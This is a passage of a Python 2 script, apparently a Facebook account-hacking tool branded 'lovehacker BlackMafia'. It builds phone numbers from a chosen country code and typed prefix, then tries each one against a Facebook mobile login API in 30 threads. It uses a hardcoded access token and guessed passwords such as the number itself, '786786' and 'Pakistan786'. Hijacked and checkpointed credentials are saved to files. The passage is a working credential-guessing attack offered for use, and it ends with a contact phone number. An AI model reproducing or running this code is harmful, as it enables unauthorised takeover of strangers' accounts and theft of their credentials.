		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+90"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="23":
                print (logo53)
		os.system("clear")
		print (logo49)
		print("\033[1;93m(leave the first tree digits and the last seven digits of any phone number in this country.Write the remaining digits here.50,55,58,54,56")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+971"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
        elif lovehackerx =="24":
                print (logo53)
		os.system("clear")
		print (logo50)
		print("\033[1;93m(leave the first three digits and the last seven digits of any phone number in this country.Write the remaining digits here.50,51,52,53,54,55,56,57,58,")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+966"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
        elif lovehackerx =="25":
                print (logo53)
		os.system("clear")
		print (logo51)
		print("\033[1;93m(leave the first three digits and the last seven digits of any phone number in this country.Write the remaining digits here. 52,55")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+972"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
        elif lovehackerx =="26":
                print (logo53)
		os.system("clear")
		print (logo52)
		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.990,915,901,933,938,902")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+98"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =='0':
		login()
	else:
		print '[!] Fill in correctly'
		action()

	xxx = str(len(id))
	jalan ('[✓] Total Numbers: '+xxx)
	time.sleep(0.05)
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
	time.sleep(0.05)
	jalan ('[!] To Stop Process Press CTRL Then Press z')
	time.sleep(0.05)
	print 44*'-'
	print (logo13)
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m{Hack}  ' + k + c + user + '  》  ' + pass1+'\n'+"\n"
				okb = open('save/successfull.txt', 'a')
				okb.write(k+c+user+'-•◈•-'+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;96m[Error] ' + k + c + user + '  》  ' + pass1+'\n'
					cps = open('save/checkpoint.txt', 'a')
					cps.write(k+c+user+'-•◈•-'+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
 				else:
 				    pass2="786786"
 				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 				    q = json.load(data)
 				    if 'access_token' in q:
 				        print '\x1b[1;92m{Hack}  ' + k + c + user + '  》  ' + pass2+'\n'+"\n"
 				        okb = open('save/successfull.txt', 'a')
 				        okb.write(k+c+user+'-•◈•-'+pass2+'\n')
 				        okb.close()
 				        oks.append(c+user+pass2)
 				    else:
 				        if 'www.facebook.com' in q['error_msg']:
 					        print '\033[1;96m[Error] ' + k + c + user + '  》  ' + pass2+'\n'
 					        cps = open('save/checkpoint.txt', 'a')
 					        cps.write(k+c+user+'-•◈•-'+pass2+'\n')
 					        cps.close()
 					        cpb.append(c+user+pass2)
                                        else:
 				            pass3="Pakistan"
 				            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 				            q = json.load(data)
 				            if 'access_token' in q:
 				                print '\x1b[1;92m{Hack}  ' + k + c + user + '  》  ' + pass3+'\n'+"\n"
 				                okb = open('save/successfull.txt', 'a')
 				                okb.write(k+c+user+'-•◈•-'+pass3+'\n')
 				                okb.close()
 				                oks.append(c+user+pass3)
 				            else:
 				                if 'www.facebook.com' in q['error_msg']:
 					                print '\033[1;96m[Error] ' + k + c + user + '  》  ' + pass3+'\n'
 					                cps = open('save/checkpoint.txt', 'a')
 					                cps.write(k+c+user+'-•◈•-'+pass3+'\n')
 					                cps.close()
 					                cpb.append(c+user+pass3)
                                                else:
 				                    pass4="Pakistan786"
 				                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 				                    q = json.load(data)
 				                    if 'access_token' in q:
 				                        print '\x1b[1;92m{Hack}  ' + k + c + user + '  》  ' + pass4+'\n'+"\n"
 				                        okb = open('save/successfull.txt', 'a')
 				                        okb.write(k+c+user+'-•◈•-'+pass4+'\n')
 				                        okb.close()
 				                        oks.append(c+user+pass4)
 				                    else:
 				                        if 'www.facebook.com' in q['error_msg']:
 					                        print '\033[1;96m[Error] ' + k + c + user + '  》  ' + pass4+'\n'
 					                        cps = open('save/checkpoint.txt', 'a')
 					                        cps.write(k+c+user+'-•◈•-'+pass4+'\n')
 					                        cps.close()
 					                        cpb.append(c+user+pass4)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 44*'-'
	print '[✓] Process Has Been Completed ....'
	print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
	print """
\033[1;93m██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗
\033[1;93m██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝
\033[1;93m██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░
\033[1;93m██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░
\033[1;93m██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗
\033[1;93m╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
\033[1;92m███╗░░░███╗░█████╗░███████╗██╗░█████╗░
\033[1;92m████╗░████║██╔══██╗██╔════╝██║██╔══██╗
\033[1;92m██╔████╔██║███████║█████╗░░██║███████║
\033[1;92m██║╚██╔╝██║██╔══██║██╔══╝░░██║██╔══██║
\033[1;92m██║░╚═╝░██║██║░░██║██║░░░░░██║██║░░██║
\033[1;92m╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝
 
 \033[1;96mDon't Worry Your Error ID Will Be Open After 7 Days 

•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;91m ....lovehacker  BlackMafia....... \033[1;95m :
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                WhatsApp Num
              \033[1;91m +923094161457"""
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	login()	
          
if __name__ == '__main__':
	login()
